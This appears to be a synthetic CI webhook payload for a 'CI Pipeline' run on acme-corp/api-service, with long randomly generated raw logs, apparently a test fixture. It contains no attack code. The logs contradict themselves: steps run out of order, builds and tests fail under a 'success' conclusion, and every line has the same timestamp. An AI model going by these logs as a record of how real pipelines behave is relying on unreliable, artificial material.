{
  "action": "completed",
  "workflow_run": {
    "id": 52,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "44162adbcdb4d6601d842715d68d462ae5752acd",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-27T12:00:18.386362Z",
    "updated_at": "2025-11-27T12:02:57.823491Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\n\u2713 test completed\nCompiling src/handler.rs...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/utils.go...\nCompiling src/service.java...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/main.py...\n  PASS: test_cache_hit (341ms)\n[12:00:18] INFO: Processing request\n\u2713 test completed\nCache hit for key-2957\n[12:00:18] WARN: Deprecated API usage\nCompiling src/service.java...\nCompiling src/index.js...\nCompiling src/utils.go...\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nWARNING: axios has known vulnerabilities\nInstalling axios@2.15.0\n  PASS: test_auth_login (75ms)\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\nCache hit for key-1799\nCache hit for key-7892\nArtifact uploaded: build.tar.gz (39MB)\nInstalling lodash@5.6.0\nCache hit for key-3524\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_api_health (68ms)\n\u2713 build completed\nInstalling webpack@5.9.0\n\u2713 lint completed\n  PASS: test_auth_login (304ms)\nInstalling webpack@2.15.0\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 build completed\n  PASS: test_api_health (8ms)\n[12:00:18] INFO: Processing request\nInstalling react@2.6.0\nStep 9/10: Building\n\u2713 lint completed\nStep 10/10: Building\nCache hit for key-1433\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (22MB)\nWARNING: webpack has known vulnerabilities\n[12:00:18] INFO: Processing request\nInstalling express@3.4.0\nCache hit for key-8406\n  PASS: test_cache_hit (107ms)\n  PASS: test_db_connect (92ms)\nInstalling prettier@5.18.0\nCache hit for key-9166\n  PASS: test_user_create (170ms)\nInstalling webpack@1.18.0\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_user_create (344ms)\n\u2713 build completed\n  PASS: test_auth_login (83ms)\nInstalling react@2.0.0\nArtifact uploaded: build.tar.gz (22MB)\nInstalling jest@4.5.0\nInstalling react@2.15.0\nCache hit for key-3271\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_api_health (50ms)\n[12:00:18] INFO: Processing request\nCache hit for key-5963\n  PASS: test_api_health (142ms)\nStep 10/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/service.java...\nInstalling prettier@4.17.0\n\u2713 build completed\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\nCache hit for key-2971\nInstalling prettier@4.7.0\n\u2713 test completed\n  PASS: test_db_connect (484ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (29MB)\nStep 7/10: Building\nInstalling webpack@4.5.0\n  PASS: test_auth_login (428ms)\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (37MB)\nInstalling webpack@4.2.0\n[12:00:18] INFO: Processing request\n\u2713 build completed\nStep 4/10: Building\n  PASS: test_user_create (377ms)\nInstalling webpack@5.6.0\n[12:00:18] INFO: Processing request\nInstalling prettier@4.14.0\nStep 1/10: Building\n\u2713 test completed\nCache hit for key-2422\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 test completed\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-2116\n\u2713 test completed\nCache hit for key-1392\nStep 6/10: Building\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\nInstalling eslint@2.0.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:18] WARN: Deprecated API usage\nInstalling jest@5.7.0\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n\u2717 build failed with exit code 93\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-3589\n\u2713 test completed\nStep 10/10: Building\nWARNING: prettier has known vulnerabilities\nStep 9/10: Building\nStep 9/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 7/10: Building\n\u2713 lint completed\n[12:00:18] WARN: Deprecated API usage\nInstalling jest@5.4.0\n  PASS: test_user_create (153ms)\nCache hit for key-9863\n\u2717 build failed with exit code 105\nCache hit for key-2583\nCompiling src/app.ts...\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-4951\n\u2713 build completed\nStep 1/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 lint completed\nWARNING: express has known vulnerabilities\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-1536\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\nCache hit for key-2238\nInstalling prettier@4.6.0\n\u2717 build failed with exit code 92\nArtifact uploaded: build.tar.gz (22MB)\nInstalling lodash@1.12.0\nException: RuntimeError\nInstalling lodash@1.11.0\n=== Step integration_tests completed ===\n=== Step: checkout ===\nStep 4/10: Building\n\u2713 build completed\n\u2713 build completed\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (120ms)\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_api_health (496ms)\nStep 8/10: Building\n  PASS: test_db_connect (177ms)\n  PASS: test_api_health (410ms)\nStep 4/10: Building\nInstalling express@5.10.0\n[12:00:18] WARN: Deprecated API usage\nCompiling src/utils.go...\n  PASS: test_api_health (55ms)\nStep 6/10: Building\n[12:00:18] INFO: Processing request\nStep 5/10: Building\n  PASS: test_cache_hit (285ms)\n  PASS: test_cache_hit (339ms)\nCache hit for key-5137\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (23MB)\nInstalling jest@3.4.0\nFAILED: test_auth_login\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nInstalling webpack@5.4.0\nInstalling lodash@2.12.0\nCompiling src/app.ts...\nCompiling src/handler.rs...\n\u2713 test completed\nCache hit for key-7382\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n\u2713 build completed\nWARNING: webpack has known vulnerabilities\nInstalling webpack@3.14.0\nCache hit for key-6440\nCompiling src/main.py...\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_db_connect (342ms)\n\u2713 lint completed\nInstalling eslint@3.9.0\nInstalling lodash@3.1.0\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (295ms)\nCache hit for key-7662\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nStep 9/10: Building\n\u2713 test completed\nStep 5/10: Building\nFAILED: test_api_health\n[12:00:18] WARN: Deprecated API usage\nCompiling src/app.ts...\nStep 3/10: Building\n\u2713 lint completed\nInstalling webpack@4.12.0\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-6867\nCompiling src/service.java...\n\u2713 lint completed\nCache hit for key-5279\nCache hit for key-6510\nInstalling eslint@4.10.0\nCompiling src/index.js...\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\nInstalling eslint@2.8.0\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (26MB)\n\u2717 build failed with exit code 71\nCache hit for key-1586\nWARNING: axios has known vulnerabilities\nInstalling jest@3.7.0\n\u2713 lint completed\nInstalling prettier@2.10.0\n[12:00:18] INFO: Processing request\nCache hit for key-6026\nInstalling eslint@2.7.0\n=== Step checkout completed ===\n=== Step: type_check ===\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_user_create (177ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (23MB)\n\u2717 build failed with exit code 72\nStep 9/10: Building\nStep 7/10: Building\n\u2713 lint completed\nCache hit for key-8944\n  PASS: test_cache_hit (34ms)\nCompiling src/main.py...\nCache hit for key-9213\n  PASS: test_user_create (412ms)\nInstalling express@3.13.0\n  PASS: test_db_connect (29ms)\nStep 7/10: Building\n\u2713 lint completed\n\u2713 build completed\n[12:00:18] ERROR: Connection failed\nStep 9/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_db_connect (372ms)\nCompiling src/index.js...\nInstalling react@5.14.0\n[12:00:18] INFO: Processing request\nCache hit for key-5022\nCache hit for key-6064\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-7878\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nStep 4/10: Building\nInstalling jest@5.5.0\n  PASS: test_user_create (289ms)\n  PASS: test_cache_hit (259ms)\nCompiling src/handler.rs...\nFAILED: test_db_connect\nStep 7/10: Building\n\u2717 build failed with exit code 123\nCache hit for key-2872\n  PASS: test_cache_hit (408ms)\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5961\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (442ms)\nInstalling express@4.16.0\nInstalling lodash@5.11.0\nCache hit for key-9450\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_api_health (109ms)\n\u2713 test completed\nStep 1/10: Building\nCache hit for key-5815\nInstalling prettier@2.11.0\nCompiling src/index.js...\nInstalling jest@3.3.0\n\u2713 build completed\n[12:00:18] INFO: Processing request\n\u2713 build completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nStep 1/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nWARNING: react has known vulnerabilities\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_auth_login (445ms)\nArtifact uploaded: build.tar.gz (47MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n  PASS: test_cache_hit (335ms)\nInstalling eslint@3.8.0\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nStep 10/10: Building\nStep 6/10: Building\nCache hit for key-4750\nCompiling src/app.ts...\nStep 7/10: Building\n  PASS: test_db_connect (168ms)\nStep 10/10: Building\n=== Step type_check completed ===\n=== Step: save_cache ===\nCompiling src/service.java...\nCompiling src/utils.go...\nInstalling express@4.6.0\n  PASS: test_db_connect (216ms)\nCache hit for key-6978\n\u2713 test completed\nInstalling lodash@5.20.0\n[12:00:18] INFO: Processing request\nInstalling prettier@2.12.0\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/handler.rs...\n  PASS: test_user_create (12ms)\nArtifact uploaded: build.tar.gz (35MB)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 lint completed\n  PASS: test_cache_hit (387ms)\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: build.tar.gz (38MB)\nInstalling react@4.2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-4304\n  PASS: test_auth_login (110ms)\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (14MB)\nStep 6/10: Building\n  PASS: test_auth_login (318ms)\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-1457\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-6135\n  PASS: test_cache_hit (186ms)\nStep 2/10: Building\nCompiling src/utils.go...\nInstalling jest@5.5.0\nCache hit for key-3153\n  PASS: test_db_connect (355ms)\nInstalling axios@3.18.0\n\u2713 lint completed\nStep 6/10: Building\nCompiling src/main.py...\nInstalling prettier@2.4.0\nCompiling src/main.py...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (50MB)\nStep 5/10: Building\nCompiling src/index.js...\n  PASS: test_api_health (373ms)\nInstalling eslint@4.12.0\nInstalling express@3.16.0\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (9MB)\nStep 5/10: Building\nInstalling lodash@5.16.0\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:18] INFO: Processing request\nCache hit for key-8676\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/service.java...\n  PASS: test_db_connect (62ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (27MB)\nInstalling jest@1.18.0\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (65ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_db_connect (146ms)\nStep 10/10: Building\nInstalling axios@4.20.0\nStep 10/10: Building\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-5237\n  PASS: test_api_health (78ms)\n\u2713 build completed\n=== Step save_cache completed ===\n=== Step: build ===\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u2713 test completed\nInstalling eslint@5.0.0\n\u2713 build completed\n\u2717 build failed with exit code 87\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (427ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 test completed\n  PASS: test_api_health (368ms)\nCache hit for key-4305\n\u2713 test completed\nStep 10/10: Building\n\u2713 build completed\nCompiling src/main.py...\nCache hit for key-5044\n  PASS: test_api_health (328ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-4213\nCache hit for key-7742\nArtifact uploaded: build.tar.gz (16MB)\nInstalling express@5.16.0\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (386ms)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-1296\nInstalling eslint@4.12.0\nCache hit for key-5942\nCache hit for key-4887\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 build completed\nInstalling express@2.6.0\n\u2713 lint completed\n\u2717 build failed with exit code 10\nStep 7/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (50MB)\nInstalling react@3.1.0\nInstalling webpack@1.12.0\n  PASS: test_auth_login (443ms)\n  PASS: test_api_health (1ms)\nCache hit for key-1038\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (341ms)\n  PASS: test_user_create (3ms)\nInstalling eslint@1.20.0\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:18] INFO: Processing request\nStep 6/10: Building\nCompiling src/service.java...\n\u2713 build completed\nInstalling prettier@1.9.0\n\u2713 test completed\nCache hit for key-5322\n\u2713 lint completed\n  PASS: test_api_health (471ms)\nCompiling src/index.js...\nCache hit for key-1532\nStep 2/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-9032\nCompiling src/main.py...\nException: ValueError\nInstalling axios@2.9.0\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nCache hit for key-2449\n  PASS: test_db_connect (34ms)\nInstalling express@3.1.0\nCache hit for key-2290\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (9MB)\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:18] WARN: Deprecated API usage\nCompiling src/service.java...\nInstalling eslint@5.10.0\nStep 10/10: Building\nStep 10/10: Building\nCache hit for key-9128\nArtifact uploaded: build.tar.gz (47MB)\n=== Step build completed ===\n=== Step: deploy_production ===\nStep 6/10: Building\nCache hit for key-4027\nCompiling src/utils.go...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nStep 7/10: Building\nCache hit for key-2479\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nStep 9/10: Building\n  PASS: test_db_connect (392ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_auth_login (106ms)\nCache hit for key-2049\n  PASS: test_api_health (484ms)\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\nInstalling prettier@1.18.0\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (14MB)\nInstalling eslint@3.8.0\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-8150\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-9816\nArtifact uploaded: build.tar.gz (30MB)\nException: RuntimeError\nInstalling prettier@4.8.0\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-3010\nInstalling lodash@3.20.0\n\u2713 test completed\nInstalling prettier@4.6.0\nCompiling src/utils.go...\n  PASS: test_db_connect (449ms)\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-7294\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:18] INFO: Processing request\nInstalling react@4.0.0\nInstalling react@1.6.0\n  PASS: test_auth_login (224ms)\nCache hit for key-6446\nCompiling src/handler.rs...\nStep 2/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nInstalling jest@3.0.0\n\u2713 build completed\nStep 5/10: Building\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCache hit for key-3021\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 52\n  PASS: test_db_connect (170ms)\nInstalling jest@1.3.0\nCompiling src/index.js...\n  PASS: test_cache_hit (265ms)\n  PASS: test_auth_login (208ms)\n[12:00:18] WARN: Deprecated API usage\nStep 5/10: Building\nCompiling src/utils.go...\nInstalling lodash@1.3.0\nInstalling express@1.15.0\n[12:00:18] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nStep 10/10: Building\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (12MB)\nStep 9/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 build completed\nCache hit for key-2157\nArtifact uploaded: build.tar.gz (11MB)\n=== Step deploy_production completed ===\n=== Step: setup_node ===\nCache hit for key-2719\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-3225\n[12:00:18] INFO: Processing request\nCache hit for key-9616\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_auth_login (303ms)\n  PASS: test_api_health (125ms)\nCache hit for key-3968\nCache hit for key-1275\n\u2713 lint completed\nCache hit for key-5213\n  PASS: test_user_create (474ms)\nCache hit for key-5141\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-5322\n  PASS: test_db_connect (310ms)\nArtifact uploaded: build.tar.gz (50MB)\nStep 4/10: Building\n\u2713 test completed\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nCompiling src/utils.go...\n\u2713 build completed\n\u2713 test completed\nInstalling react@2.0.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/service.java...\nInstalling express@5.10.0\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/index.js...\nCompiling src/handler.rs...\n[12:00:18] ERROR: Connection failed\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-1079\nInstalling react@5.12.0\nArtifact uploaded: build.tar.gz (7MB)\nStep 9/10: Building\nCompiling src/index.js...\nInstalling lodash@3.8.0\n  PASS: test_user_create (446ms)\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-7756\nCache hit for key-4986\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-2519\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling react@2.18.0\nStep 3/10: Building\nCache hit for key-4926\n[12:00:18] INFO: Processing request\nInstalling lodash@3.10.0\n  PASS: test_user_create (344ms)\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n[12:00:18] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\nCompiling src/service.java...\nCompiling src/handler.rs...\nInstalling lodash@5.19.0\n[12:00:18] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nStep 6/10: Building\nCompiling src/handler.rs...\n  PASS: test_auth_login (49ms)\n  PASS: test_cache_hit (253ms)\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (50MB)\nWARNING: prettier has known vulnerabilities\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\n=== Step setup_node completed ===\n=== Step: lint ===\nInstalling express@5.14.0\nInstalling react@1.7.0\nStep 2/10: Building\nCache hit for key-4842\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (46MB)\nCompiling src/utils.go...\nWARNING: prettier has known vulnerabilities\n  PASS: test_api_health (285ms)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/utils.go...\n  PASS: test_user_create (160ms)\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (440ms)\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 test completed\n[12:00:18] INFO: Processing request\nInstalling jest@4.3.0\nArtifact uploaded: build.tar.gz (16MB)\n\u2717 build failed with exit code 75\n\u2713 lint completed\nCompiling src/utils.go...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-2394\nCompiling src/app.ts...\nInstalling eslint@3.14.0\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 lint completed\n\u2713 build completed\nStep 6/10: Building\nInstalling eslint@4.16.0\n\u2713 build completed\n  PASS: test_api_health (498ms)\n  PASS: test_auth_login (160ms)\n  PASS: test_cache_hit (455ms)\nCache hit for key-7019\nStep 5/10: Building\n\u2713 test completed\nInstalling react@5.17.0\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 test completed\nInstalling lodash@4.13.0\nCache hit for key-5241\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling prettier@3.13.0\nInstalling express@2.15.0\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\nCache hit for key-3580\n[12:00:18] INFO: Processing request\nInstalling react@5.10.0\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:18] INFO: Processing request\nStep 3/10: Building\nCompiling src/main.py...\nStep 8/10: Building\n\u2713 build completed\nCache hit for key-8799\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@1.12.0\n  PASS: test_db_connect (352ms)\nCache hit for key-1066\nWARNING: express has known vulnerabilities\nCache hit for key-9600\nCompiling src/main.py...\n  PASS: test_user_create (114ms)\n[12:00:18] INFO: Processing request\nInstalling webpack@4.14.0\n\u2713 lint completed\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/app.ts...\nInstalling lodash@5.11.0\nCompiling src/handler.rs...\n  PASS: test_auth_login (409ms)\nCache hit for key-7469\nException: ValueError\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (19MB)\nStep 6/10: Building\n  PASS: test_cache_hit (106ms)\n=== Step lint completed ===\n=== Step: upload_artifacts ===\nInstalling lodash@4.17.0\n[12:00:18] INFO: Processing request\nStep 1/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\n\u2713 test completed\n[12:00:18] ERROR: Connection failed\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:18] INFO: Processing request\nInstalling axios@3.7.0\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (33MB)\nStep 8/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (381ms)\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_api_health (291ms)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n[12:00:18] INFO: Processing request\nStep 1/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (62ms)\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (346ms)\nStep 2/10: Building\n  PASS: test_auth_login (117ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (409ms)\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/handler.rs...\nCache hit for key-3253\n\u2713 lint completed\n\u2713 test completed\nStep 8/10: Building\n  PASS: test_user_create (232ms)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling express@4.11.0\n  PASS: test_cache_hit (417ms)\nCache hit for key-4923\nFAILED: test_user_create\nWARNING: axios has known vulnerabilities\n\u2713 build completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nInstalling webpack@4.2.0\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (164ms)\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 109\n\u2713 test completed\nInstalling react@4.9.0\n\u2713 lint completed\n\u2713 lint completed\nStep 3/10: Building\nStep 8/10: Building\nCache hit for key-8278\n[12:00:18] ERROR: Connection failed\n  PASS: test_api_health (328ms)\nCache hit for key-1034\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-4302\n\u2713 lint completed\nInstalling react@4.15.0\nArtifact uploaded: build.tar.gz (39MB)\nInstalling axios@4.9.0\n  PASS: test_user_create (304ms)\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_db_connect (275ms)\nCache hit for key-3781\n=== Step upload_artifacts completed ===\n=== Step: deploy_staging ===\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (171ms)\n\u2713 build completed\nCache hit for key-4688\n\u2713 build completed\nCompiling src/service.java...\n[12:00:18] WARN: Deprecated API usage\nInstalling lodash@4.10.0\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:18] ERROR: Connection failed\nCompiling src/main.py...\n\u2713 test completed\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (37ms)\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_cache_hit (14ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/utils.go...\nCompiling src/app.ts...\n\u2713 lint completed\n 